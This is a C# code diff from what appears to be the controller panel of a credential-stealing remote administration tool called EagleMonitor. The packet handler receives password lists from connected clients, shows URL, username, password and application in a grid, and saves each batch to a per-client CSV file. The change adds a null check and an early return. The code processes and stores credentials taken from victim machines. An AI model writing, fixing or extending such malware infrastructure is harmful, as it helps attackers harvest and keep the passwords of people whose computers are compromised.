@@ -33,32 +33,36 @@ namespace EagleMonitor.PacketParser
             {
                 if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Passwords\\"))
                     System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Passwords");
-
-                try
+                if (passwordsPacket.passwordsList != null)
                 {
-                    if (clientHandler.passwordsForm.dataGridView1 != null)
+                    try
                     {
-                        clientHandler.passwordsForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
+                        if (clientHandler.passwordsForm.dataGridView1 != null)
                         {
-                            clientHandler.passwordsForm.dataGridView1.Rows.Clear();
-                            foreach (object[] str in passwordsPacket.passwordsList)
+                            clientHandler.passwordsForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                             {
-                                int rowId = clientHandler.passwordsForm.dataGridView1.Rows.Add();
-                                DataGridViewRow row = clientHandler.passwordsForm.dataGridView1.Rows[rowId];
-                                row.Cells["Column1"].Value = str[0].ToString();
-                                row.Cells["Column2"].Value = str[1].ToString();
-                                row.Cells["Column3"].Value = str[2].ToString();
-                                row.Cells["Column4"].Value = str[3].ToString();
-                            }
-                            Miscellaneous.ToCSV(clientHandler.passwordsForm.dataGridView1, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv");
-                            clientHandler.passwordsForm.loadingCircle1.Visible = false;
-                            clientHandler.passwordsForm.loadingCircle1.Active = false;
-                        }));
+                                clientHandler.passwordsForm.dataGridView1.Rows.Clear();
+                                foreach (object[] str in passwordsPacket.passwordsList)
+                                {
+                                    int rowId = clientHandler.passwordsForm.dataGridView1.Rows.Add();
+                                    DataGridViewRow row = clientHandler.passwordsForm.dataGridView1.Rows[rowId];
+                                    row.Cells["Column1"].Value = str[0].ToString();
+                                    row.Cells["Column2"].Value = str[1].ToString();
+                                    row.Cells["Column3"].Value = str[2].ToString();
+                                    row.Cells["Column4"].Value = str[3].ToString();
+                                }
+                                Miscellaneous.ToCSV(clientHandler.passwordsForm.dataGridView1, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv");
+                                clientHandler.passwordsForm.loadingCircle1.Visible = false;
+                                clientHandler.passwordsForm.loadingCircle1.Active = false;
+                            }));
+                        }
+                        else
+                        { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
                     }
-                    else
-                    { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
+                    catch { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
                 }
-                catch { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
+                else
+                    return;
             }).Start();
         }
     }
